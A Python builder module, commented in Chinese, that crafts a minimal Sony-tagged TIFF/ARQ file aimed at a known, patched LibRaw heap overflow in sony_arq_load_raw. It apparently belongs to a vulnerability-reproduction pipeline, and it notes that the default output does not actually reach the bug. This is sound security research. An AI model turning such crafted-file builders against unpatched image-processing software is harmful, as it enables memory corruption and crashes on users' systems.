"""CG-33（arvo:60983 / libraw Sony ARQ）试验构造器。

**目标缺陷**：src/decoders/decoders_libraw.cpp 的 sony_arq_load_raw()：

    read_shorts(imgdata.rawdata.raw_image,
                imgdata.sizes.raw_width * imgdata.sizes.raw_height * 4);   /* :20 */

ARQ 是 4 通道（RGBG）数据；当元数据不足（filters 非零或 colors < 3）时
raw_image 只按 1 通道分配，read_shorts 却按 4 通道读 → H5 之外的堆写越界
（实测栈：LibRaw_buffer_datastream::read ← read_shorts ← sony_arq_load_raw）。 
patch 在函数开头加了：
    if (imgdata.idata.filters || imgdata.idata.colors < 3) throw LIBRAW_EXCEPTION_IO_CORRUPT;

**ARQ 选择的源码条件**（metadata/tiff.cpp:1788）：

    !dng_version && make 以 "Sony" 开头 &&
    tiff_ifd[raw].samples == 4 &&
    tiff_ifd[raw].bytes == raw_width * raw_height * 8      // 4 通道 × 2 字节

**本构造器**：造一个最小 TIFF（II*\0），IFD0/SubIFD 带 Make=Sony、SamplesPerPixel=4、
ImageWidth/Height、StripByteCounts = w*h*8、Compression=1、Photometric=1（故意让 colors<3）。
默认参数下文件能顺利打开并 unpack，但**实测没有走到 sony_arq_load_raw**（见 EVIDENCE）。
"""
from __future__ import annotations

import struct

FIELDS = {
    "width": "int, ImageWidth（默认 64）",
    "height": "int, ImageLength（默认 64）",
    "samples": "int, SamplesPerPixel（默认 4，ARQ 必需）",
    "photometric": "int, PhotometricInterpretation（默认 1 = BlackIsZero，故意让 colors<3）",
    "sub_ifd": "int(0|1), 放 IEEE SubIFD 还是直接放 IFD0（默认 1）",
    "payload_len": "int, 实际写入的像素字节数（默认 w*h*8）",
}

DECLARED_SINK = {
    "file": "src/decoders/decoders_libraw.cpp",
    "line": 20,
    "symbol": "read_shorts",
    "note": "read_shorts 按 raw_width*raw_height*4 读，raw_image 只按 1 通道分配",
}


class ArqResult:
    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "libraw_arq"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def _entry(tag, typ, count, value):
    return struct.pack("<HHI", tag, typ, count) + value


def build(fields: dict) -> ArqResult:
    fields = dict(fields or {})
    try:
        w = int(fields.get("width", 64))
        h = int(fields.get("height", 64))
        samples = int(fields.get("samples", 4))
        photometric = int(fields.get("photometric", 1))
        sub_ifd = int(fields.get("sub_ifd", 1))
        payload_len = int(fields.get("payload_len", w * h * 8))
    except (TypeError, ValueError):
        return ArqResult(False, reason="width/height/samples/photometric/sub_ifd/payload_len 必须是整数")
    if not 1 <= w <= 65535 or not 1 <= h <= 65535:
        return ArqResult(False, reason="width/height 越界: %d/%d" % (w, h))
    if samples != 4:
        return ArqResult(False, reason="samples 必须是 4（ARQ 判定条件）: %d" % samples)
    if payload_len < 0 or payload_len > 4 * 1024 * 1024:
        return ArqResult(False, reason="payload_len 越界: %d" % payload_len)

    strip_bytes = w * h * 8
    make = b"Sony\x00"
    model = b"ARQ\x00"
    val = lambda b: b.ljust(4, b"\x00")[:4]

    if sub_ifd:
        n0, n1 = 8, 9
        ifd0_size = 2 + n0 * 12 + 4
        sub_start = 8 + ifd0_size
        sub_size = 2 + n1 * 12 + 4
        ascii_start = sub_start + sub_size
    else:
        n0 = 11
        ascii_start = 8 + 2 + n0 * 12 + 4
    make_off = ascii_start
    model_off = make_off + len(make)
    data_off = model_off + len(model)
    if data_off % 2:
        data_off += 1

    if sub_ifd:
        ifd0 = struct.pack("<H", n0)
        ifd0 += _entry(0x010F, 2, len(make), val(struct.pack("<I", make_off)))
        ifd0 += _entry(0x0110, 2, len(model), val(struct.pack("<I", model_off)))
        ifd0 += _entry(0x0100, 3, 1, val(struct.pack("<H", w)))
        ifd0 += _entry(0x0101, 3, 1, val(struct.pack("<H", h)))
        ifd0 += _entry(0x0102, 3, 1, val(struct.pack("<H", 16)))
        ifd0 += _entry(0x0103, 3, 1, val(struct.pack("<H", 1)))
        ifd0 += _entry(0x0115, 3, 1, val(struct.pack("<H", samples)))
        ifd0 += _entry(0x014A, 4, 1, val(struct.pack("<I", sub_start)))
        ifd0 += struct.pack("<I", 0)

        sub = struct.pack("<H", n1)
        sub += _entry(0x0100, 3, 1, val(struct.pack("<H", w)))
        sub += _entry(0x0101, 3, 1, val(struct.pack("<H", h)))
        sub += _entry(0x0102, 3, 1, val(struct.pack("<H", 16)))
        sub += _entry(0x0103, 3, 1, val(struct.pack("<H", 1)))
        sub += _entry(0x0106, 3, 1, val(struct.pack("<H", photometric)))
        sub += _entry(0x0115, 3, 1, val(struct.pack("<H", samples)))
        sub += _entry(0x0117, 4, 1, val(struct.pack("<I", strip_bytes)))
        sub += _entry(0x0111, 4, 1, val(struct.pack("<I", data_off)))
        sub += _entry(0x011C, 3, 1, val(struct.pack("<H", 1)))
        sub += struct.pack("<I", 0)
        body = ifd0 + sub
    else:
        ifd = struct.pack("<H", n0)
        ifd += _entry(0x010F, 2, len(make), val(struct.pack("<I", make_off)))
        ifd += _entry(0x0110, 2, len(model), val(struct.pack("<I", model_off)))
        ifd += _entry(0x0100, 3, 1, val(struct.pack("<H", w)))
        ifd += _entry(0x0101, 3, 1, val(struct.pack("<H", h)))
        ifd += _entry(0x0102, 3, 1, val(struct.pack("<H", 16)))
        ifd += _entry(0x0103, 3, 1, val(struct.pack("<H", 1)))
        ifd += _entry(0x0106, 3, 1, val(struct.pack("<H", photometric)))
        ifd += _entry(0x0115, 3, 1, val(struct.pack("<H", samples)))
        ifd += _entry(0x0117, 4, 1, val(struct.pack("<I", strip_bytes)))
        ifd += _entry(0x0111, 4, 1, val(struct.pack("<I", data_off)))
        ifd += _entry(0x011C, 3, 1, val(struct.pack("<H", 1)))
        ifd += struct.pack("<I", 0)
        body = ifd

    out = bytearray(b"II*\x00" + struct.pack("<I", 8))
    out += body + make + model
    while len(out) < data_off:
        out += b"\x00"
    out += bytes([0x40]) * payload_len
    used = {"width": w, "height": h, "samples": samples, "photometric": photometric,
            "sub_ifd": bool(sub_ifd), "strip_bytes": strip_bytes,
            "payload_len": payload_len, "bytes": len(out)}
    known = set(FIELDS)
    dropped = [{"field": k, "reason": "libraw_arq 构造器不识别该字段"}
               for k in fields if k not in known]
    return ArqResult(True, bytes(out), used, dropped, "")


def declared_claim() -> dict:
    """构造器自带主张：ARQ 4 通道读入 1 通道缓冲。"""
    return {
        "claim_id": "cg33-libraw-arq",
        "subject": "sony_arq_load_raw",
        "proposed_by": "builder",
        "subject_source": "builder",
        "evidence_source": "agent/builders/libraw_arq.py + arvo error.txt",
        "cwe": "CWE-122",
        "sink": dict(DECLARED_SINK),
        "test_plan": {"format": "libraw_arq"},
    }


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":
    r = build({})
    assert r.ok, r.reason
    assert r.data[:4] == b"II*\x00"
    assert r.fields_used["samples"] == 4
    assert r.fields_used["strip_bytes"] == 64 * 64 * 8
    assert not build({"samples": 3}).ok
    assert not build({"width": 0}).ok
    assert build({"unknown": 1}).dropped
    c = declared_claim()
    assert c["subject"] == "sony_arq_load_raw" and c["sink"]["line"] == 20
    print("libraw_arq builder self-check OK:", r.to_record())
